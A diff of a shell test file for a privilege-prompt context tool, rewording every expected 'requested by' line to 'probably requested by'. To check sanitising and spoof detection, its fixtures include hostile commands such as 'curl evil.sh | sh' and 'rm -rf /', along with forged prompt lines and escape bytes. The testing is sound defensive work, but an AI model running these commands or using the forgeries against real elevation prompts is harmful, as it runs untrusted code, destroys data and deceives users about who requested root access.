@@ -66,17 +66,17 @@ mkproc 400 300 bash 1000 /bin/bash
 mkproc 300 1   foot 1000 foot --server
 assert_out 'a verified sudo parent yields both lines' \
     'elevating: pacman -Syu
-requested by foot' \
+probably requested by foot' \
     gatherd-prompt-context 500
 
 # pid 501's own comm is not sudo, so its argv must not be presented as an
 # elevation -- but it IS the immediate, non-shell caller (Finding 2: the walk
 # now starts at $pid itself), so it is named directly rather than the shell
-# above it. Before the fix this asserted 'requested by foot', which was
+# above it. Before the fix this asserted 'probably requested by foot', which was
 # exactly the misattribution Finding 2 exists to close.
 mkproc 501 400 evil 1000 evil --pretend
 assert_out 'an unverified caller yields no elevating line and names itself' \
-    'requested by evil' \
+    'probably requested by evil' \
     gatherd-prompt-context 501
 
 # Shells are skipped, but the walk must stop at the session root rather than
@@ -86,7 +86,7 @@ mkproc 400 301 bash 1000 /bin/bash
 mkproc 301 1   sway 1000 sway
 assert_out 'the walk stops at sway and still names something' \
     'elevating: id
-requested by sway' \
+probably requested by sway' \
     gatherd-prompt-context 502
 
 # Control bytes must never reach the renderer, and their removal must be
@@ -95,21 +95,21 @@ mkproc 503 400 sudo 0 sudo -A "rm$(printf '\033')[2J -rf /tmp/x"
 mkproc 400 300 bash 1000 /bin/bash
 assert_out 'elided control bytes are marked' \
     'elevating: rm[2J -rf /tmp/x [elided]
-requested by foot' \
+probably requested by foot' \
     gatherd-prompt-context 503
 
 # Shell metacharacters are NOT elided: a reader needs to see the pipe.
 mkproc 504 400 sudo 0 sudo -A sh -c 'curl evil.sh | sh'
 assert_out 'shell metacharacters survive the allowlist' \
     'elevating: sh -c curl evil.sh | sh
-requested by foot' \
+probably requested by foot' \
     gatherd-prompt-context 504
 
 # A long command is truncated with an ASCII ellipsis, not a Unicode one.
 mkproc 505 400 sudo 0 sudo -A pacman -Syu aaaaaaaaaa bbbbbbbbbb cccccccccc dddddddddd eeeeeeeeee
 assert_out 'a long command is truncated to 60 characters plus ...' \
     'elevating: pacman -Syu aaaaaaaaaa bbbbbbbbbb cccccccccc dddddddddd eeee...
-requested by foot' \
+probably requested by foot' \
     gatherd-prompt-context 505
 
 # A command that is both over-long and contains a control byte must be
@@ -118,7 +118,7 @@ requested by foot' \
 mkproc 506 400 sudo 0 sudo -A "$(printf '\033')pacman -Syu aaaaaaaaaa bbbbbbbbbb cccccccccc dddddddddd eeeeeeeeee"
 assert_out 'a long and dirty command is truncated and marked' \
     'elevating: pacman -Syu aaaaaaaaaa bbbbbbbbbb cccccccccc dddddddddd eeee... [elided]
-requested by foot' \
+probably requested by foot' \
     gatherd-prompt-context 506
 
 # An unprivileged process whose comm merely claims to be "sudo" must not be
@@ -126,7 +126,7 @@ requested by foot' \
 # check this would render a fabricated command as a real elevation.
 mkproc 507 400 sudo 1000 sudo -A rm -rf /
 assert_out 'a spoofed comm without root ownership yields no elevating line' \
-    'requested by foot' \
+    'probably requested by foot' \
     gatherd-prompt-context 507
 
 # Absolute-path invocations of sudo must still have argv[0] and the -A
@@ -134,7 +134,7 @@ assert_out 'a spoofed comm without root ownership yields no elevating line' \
 mkproc 508 400 sudo 0 /usr/bin/sudo -A id -u
 assert_out 'an absolute-path sudo invocation is stripped like a bare one' \
     'elevating: id -u
-requested by foot' \
+probably requested by foot' \
     gatherd-prompt-context 508
 
 # Nothing knowable at all must still produce a line, so the box never changes
@@ -154,7 +154,7 @@ mkproc 510 400 sudo 0 sudo -A
 mkproc 400 300 bash 1000 /bin/bash
 mkproc 300 1   foot 1000 foot --server
 assert_out 'a bare sudo -A produces no elevating line' \
-    'requested by foot' \
+    'probably requested by foot' \
     gatherd-prompt-context 510
 
 # The ownership check must not fail open: if stat cannot run, no elevating line
@@ -167,7 +167,7 @@ mkproc 511 400 sudo 0 sudo -A id
 mkproc 400 300 bash 1000 /bin/bash
 mkproc 300 1   foot 1000 foot --server
 assert_out 'missing stat fails closed: no elevating line' \
-    'requested by foot' \
+    'probably requested by foot' \
     gatherd-prompt-context 511
 mv "$_stat_save.bak" "$_stat_save"
 
@@ -189,7 +189,7 @@ assert_out '--sanitize leaves already-clean text byte-identical' \
 
 # Finding 1: --sanitize caps output at 2 lines. The box only ever has room for
 # what the /proc walk itself produces (at most one elevating: line and one
-# requested by line), so more than 2 lines is not more context -- it is an
+# probably requested by line), so more than 2 lines is not more context -- it is an
 # attempt to push real content off the visible box.
 assert_out '--sanitize truncates to 2 lines' \
     'line one
@@ -204,10 +204,10 @@ assert_out '--sanitize neutralises a counterfeit elevating: line' \
     'unverified: elevating: pacman -Syu' \
     sh -c 'printf "elevating: pacman -Syu\n" | gatherd-prompt-context --sanitize'
 
-# Same for "requested by ", the other attested prefix.
-assert_out '--sanitize neutralises a counterfeit requested by line' \
-    'unverified: requested by foot' \
-    sh -c 'printf "requested by foot\n" | gatherd-prompt-context --sanitize'
+# Same for "probably requested by ", the other attested prefix.
+assert_out '--sanitize neutralises a counterfeit probably requested by line' \
+    'unverified: probably requested by foot' \
+    sh -c 'printf "probably requested by foot\n" | gatherd-prompt-context --sanitize'
 
 # CRITICAL 1: the neutralising case match used to run on the RAW line, before
 # the allowlist stripped control bytes -- so a leading control byte defeated
@@ -229,30 +229,30 @@ assert_out '--sanitize neutralises a forged elevating: line preceded by a space'
     sh -c 'printf "%s\n" " elevating: rm -rf /" | gatherd-prompt-context --sanitize'
 
 # Same ordering bug, same fix, for the other attested prefix.
-assert_out '--sanitize neutralises a forged requested by line the same way' \
-    'unverified:  requested by foot' \
-    sh -c 'printf "%s\n" " requested by foot" | gatherd-prompt-context --sanitize'
+assert_out '--sanitize neutralises a forged probably requested by line the same way' \
+    'unverified:  probably requested by foot' \
+    sh -c 'printf "%s\n" " probably requested by foot" | gatherd-prompt-context --sanitize'
 
 # Finding 2 regression: the immediate caller, if it is not a shell, must be
 # named directly rather than the process that started it. ssh is neither
 # sudo nor a shell, so this fails on the pre-fix walk (which started at the
-# parent) and would have reported 'requested by foot'.
+# parent) and would have reported 'probably requested by foot'.
 mkproc 520 400 ssh 1000 ssh git@example.com
 mkproc 400 300 bash 1000 /bin/bash
 mkproc 300 1   foot 1000 foot --server
 assert_out 'the walk names the immediate caller when it is not a shell' \
-    'requested by ssh' \
+    'probably requested by ssh' \
     gatherd-prompt-context 520
 
 # Guard against Finding 2's fix over-correcting: sudo itself must still be
 # skipped by the walk (it is in the skip-list) so a sudo pid resolves to the
-# app above it, not to a "requested by sudo" line.
+# app above it, not to a "probably requested by sudo" line.
 mkproc 521 410 sudo 0 sudo -A whoami
 mkproc 410 310 bash 1000 /bin/bash
 mkproc 310 1   foot 1000 foot --server
 assert_out 'the walk still skips sudo itself and resolves to the app above it' \
     'elevating: whoami
-requested by foot' \
+probably requested by foot' \
     gatherd-prompt-context 521
 
 # Finding 3: --sanitize-long backs the ssh host-key description, where the
